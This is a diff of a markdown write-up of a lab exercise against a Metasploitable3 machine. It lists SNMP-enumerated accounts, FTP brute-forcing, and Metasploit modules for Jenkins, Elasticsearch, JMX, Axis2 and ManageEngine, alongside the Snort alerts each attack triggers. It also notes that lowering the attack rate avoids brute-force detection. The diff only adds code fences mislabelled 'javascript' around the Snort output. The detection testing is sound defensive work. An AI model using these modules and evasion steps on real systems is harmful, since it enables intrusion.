@@ -47,9 +47,11 @@ In the case of systems based solely on open source I would argue that it is alwa
 * The snmp-scanner found 20 user accounts:
 * •	Administrator, Guest, anakin_skywalker, artoo_detoo, ben_kenobi, boba_fett, c_three_pio, chewbacca, darth_vader, greedo, han_solo, jabba_hutt, jarjar_binks, kylo_ren, lando_calrissian, leah_organa, luke_skywalker, sshd, sshd_server, vagrant
 * 2.2 snort
+~~~javascript
 * A walk of the public snmp MIB was not detected by snort. Enabling rules in protocol-snmp.rules produced:
 * PROTOCOL-SNMP public access udp [**] [Classification: Attempted Information Leak]
 * PROTOCOL-SNMP request udp [**] [Classification: Attempted Information Leak]
+~~~
 # 3. Bruteforcing FTP
   3.1 msfconsole
 * Known usernames were added to users.txt.
@@ -66,7 +68,9 @@ In the case of systems based solely on open source I would argue that it is alwa
 ~~~
 * Detected credentials can be used in terminal-logins and for services like FTP, SSH, and others.
 * 3.2 snort
+~~~javascript
 * Snort does not detecting bruteforcing of FTP other than monitoring rate of logins and that could be avoided by limiting the attack rate.
+~~~
 # 4. Exploiting Jenkins
  4.1 msfconsole
 * ` msf > use exploits/multi/http/jenkins_script_console`
@@ -84,8 +88,10 @@ In the case of systems based solely on open source I would argue that it is alwa
 * Server username: NT AUTHORITY\LOCAL SERVICE
 ~~~
  4.2 snort
+ ~~~javascript
 * Enabling app-detect.rules:172, server-other.rules:1436 and changing the URI from "/jenkins/" to "/" produced:
 * APP-DETECT Jenkins Groovy script access through script console attempt [**] [Classification: Potential Corporate Privacy Violation]
+~~~
 # 5. Exploiting Elasticsearch (CVE-2014-3120)
 5.1 msfconsole
 * ` msf > use exploit/multi/elasticsearch/script_mvel_rce`
@@ -106,8 +112,10 @@ In the case of systems based solely on open source I would argue that it is alwa
 * Server username: METASPLOITABLE3$
 ~~~
 5.2 snort
+~~~javascript
 * Enabling server-other.rules:812,1336 produces:
 * SERVER-OTHER ElasticSearch script remote code execution attempt [**] [Classification: Attempted User Privilege Gain]
+~~~
 # 6. Exploiting JMX (CVE-2015-2342)
  6.1 msfconsole
 * `msf > use exploit/multi/misc/java_jmx_server`
@@ -127,8 +135,10 @@ In the case of systems based solely on open source I would argue that it is alwa
 * Server username: LOCAL SERVICE
 ~~~
 6.2 snort
+~~~javascript
 * Enabling server-other.rules:177,1346 produces:
 * SERVER-OTHER Oracle Java JMX server insecure configuration remote code execution attempt [**] [Classification: Attempted User Privilege Gain]
+~~~
 # 7. Exploiting Apache Axis2 (CVE-2010-0219)
 7.1 msfconsole
 * Default payload did not work but adjusting target and payload gained a meterpreter prompt.
@@ -152,10 +162,12 @@ In the case of systems based solely on open source I would argue that it is alwa
 * Server username: METASPLOITABLE3$
 ~~~
 7.2 snort
+~~~javascript
 * Enabling server-other.rules:1451 and policy-other.rules:84,115-116
 * POLICY-OTHER HP Universal CMDB default credentials authentication attempt [**] [Classification: Potential Corporate Privacy Violation]
 * POLICY-OTHER CA ARCserve Axis2 default credential login attempt [**] [Classification: Attempt to Login By a Default Username and * Password]
 * POLICY-OTHER HP Universal CMDB server axis2 service upload attempt [**] [Classification: Attempted Administrator Privilege Gain]
+~~~
 # 8. Exploiting ManageEngine (CVE-2015-8249)
 8.1 msfconsole
 * ` msf > use exploit/windows/http/manageengine_connectionid_write `
@@ -175,6 +187,7 @@ In the case of systems based solely on open source I would argue that it is alwa
 * Server username: NT AUTHORITY\LOCAL SERVICE
 ~~~
 8.2 snort
+~~~javascript
 * Enabling rules/server-webapp.rules:1853-1855
 * SERVER-WEBAPP ManageEngine Desktop Central FileUploadServlet directory traversal attempt [**] [Classification: Web Application Attack]
-
+~~~
